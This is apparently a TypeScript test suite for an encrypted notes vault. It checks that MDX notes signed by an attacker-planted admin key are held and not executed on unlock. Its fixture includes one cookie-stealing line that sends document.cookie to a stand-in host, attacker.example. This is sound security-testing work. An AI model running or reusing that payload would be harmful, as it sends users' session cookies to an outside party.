import { expect, test } from "bun:test";
import Dexie from "dexie";
import { IDBKeyRange, indexedDB } from "fake-indexeddb";
import { noteEntry } from "../../tests/entry-fixture.ts";
import { passkeyPort } from "../../tests/passkey-port.ts";
import { memoryPds, signedVault } from "../../tests/unlock-fixture.ts";
import {
  createSeedRecipient,
  passkeyAdmin,
  seedSigningKey,
  type VaultRecipient,
} from "../crypto/access-v3.ts";
import type { EntrySigner } from "../crypto/authorship.ts";
import { createVaultKey } from "../crypto/index.ts";
import type { SnapshotEntry } from "../sync/vault-snapshot.ts";
import { AuthVaultTransport } from "../sync/vault-transport.ts";
import { VaultDatabase } from "../vault/storage.ts";
import { unlockVault } from "./unlock.ts";

Dexie.dependencies.indexedDB = indexedDB;
Dexie.dependencies.IDBKeyRange = IDBKeyRange;

/** An admin of the attacker's own, listed as a recovery file. */
async function planted(fill: number) {
  const seed = new Uint8Array(32).fill(fill);
  const recipient = await createSeedRecipient(
    seed,
    "recovery",
    "Recovery file",
  );
  const privateKey = await seedSigningKey(seed);
  const entry: EntrySigner = {
    recipientId: recipient.id,
    signPublicKey: recipient.signPublicKey ?? "",
    privateKey,
  };
  return { recipient, access: { recipient, privateKey }, entry };
}

/**
 * A passkey's signed vault holding one MDX note it wrote, and an attacker with
 * the vault key and a browser session that can rewrite the whole record.
 */
async function world(tag: string) {
  const owner = `did:plc:first-use-${tag}`;
  const credentialId = "Zmlyc3QtdXNl";
  const prf = new Uint8Array(32).fill(8);
  const key = await createVaultKey();
  const vault = crypto.randomUUID();
  const context = { did: owner, vault };
  const pds = memoryPds(owner);
  const admin = await passkeyAdmin(prf, credentialId, owner);
  const mine = await noteEntry(
    key,
    context,
    {
      recipientId: admin.recipient.id,
      signPublicKey: admin.recipient.signPublicKey ?? "",
      privateKey: admin.privateKey,
    },
    { id: "mine", name: "Mine.mdx" },
    "export const mine = 1\n\n# Mine",
  );
  /** Writes the record a key holder with a browser session chooses: any statement, any entries. */
  async function plant(
    recipients: readonly VaultRecipient[],
    signer: Awaited<ReturnType<typeof planted>>,
    entries: SnapshotEntry[],
    sequence = 1,
  ) {
    const forged = await signedVault(
      key,
      { did: owner, vault, epoch: 1 },
      recipients,
      signer.access,
      sequence === 1 ? "create" : "change",
      sequence,
    );
    const writer = new AuthVaultTransport(pds.rpc, {
      key,
      did: owner,
      ...forged,
      pinned: null,
    });
    await writer.writeSnapshot(entries, pds.stored?.cid ?? null);
    writer.stop();
  }
  /** Unlocks with the passkey on this browser and reports each MDX note's origin. */
  async function unlock(signAccess = true) {
    const { runtime } = await unlockVault(
      passkeyPort({
        userId: `first-use-${tag}`,
        did: owner,
        credentialId,
        rpc: pds.rpc,
        prf: () => prf.slice(),
      }),
      {},
      signAccess,
    );
    try {
      await runtime.sync?.();
      return new Map(
        (await runtime.list()).map((note) => [note.path, note.origin]),
      );
    } finally {
      runtime.lock();
    }
  }
  const evil = (signer: EntrySigner, id = "evil") =>
    noteEntry(
      key,
      context,
      signer,
      { id, name: `${id}.mdx` },
      "export const x = fetch('https://attacker.example/' + document.cookie)",
    );
  return {
    pds,
    admin,
    mine,
    plant,
    unlock,
    evil,
    forget: () => new VaultDatabase(owner, vault).delete(),
  };
}

const held = {
  runs: false,
  author: "Signed by another admin key",
  reason:
    "Signed by another admin key listed for this notepad, which this browser can’t confirm",
};

for (const signAccess of [true, false])
  test(`a fresh browser runs only its own passkey's MDX under an admin a key holder planted (signAccess=${signAccess})`, async () => {
    const w = await world(`x1-${signAccess}`);
    const attacker = await planted(41);
    await w.plant([w.admin.recipient, attacker.recipient], attacker, [
      w.mine,
      await w.evil(attacker.entry),
    ]);
    const origins = await w.unlock(signAccess);
    expect(origins.get("evil.mdx")).toEqual(held);
    expect(origins.get("Mine.mdx")).toEqual({
      runs: true,
      author: "Signed by a passkey",
    });
    await w.forget();
  });

test("the planted admin still doesn't run once the browser has pinned it, or after it signs a change", async () => {
  const w = await world("pinned");
  const attacker = await planted(42);
  const evil = await w.evil(attacker.entry);
  await w.plant([w.admin.recipient, attacker.recipient], attacker, [evil]);
  expect((await w.unlock()).get("evil.mdx")).toEqual(held);
  expect((await w.unlock()).get("evil.mdx")).toEqual(held);
  const second = await planted(43);
  await w.plant(
    [w.admin.recipient, attacker.recipient, second.recipient],
    attacker,
    [evil, await w.evil(second.entry, "second")],
    2,
  );
  const origins = await w.unlock();
  expect(origins.get("evil.mdx")).toEqual(held);
  expect(origins.get("second.mdx")).toEqual(held);
  await w.forget();
});

test("a first-use pin leaves the passkey's legacy entry unsigned over a planted list, and doesn't vouch for the planted admin", async () => {
  const w = await world("upgrade");
  const attacker = await planted(44);
  const { signPublicKey: _, ...legacy } = w.admin.recipient;
  await w.plant([legacy, attacker.recipient], attacker, [
    await w.evil(attacker.entry),
  ]);
  const commits = w.pds.commits;
  const origins = await w.unlock();
  expect(origins.get("evil.mdx")).toEqual(held);
  // An upgrade signed from this pin would re-sign the planted admin into the root.
  expect(w.pds.commits).toBe(commits);
  await w.forget();
});
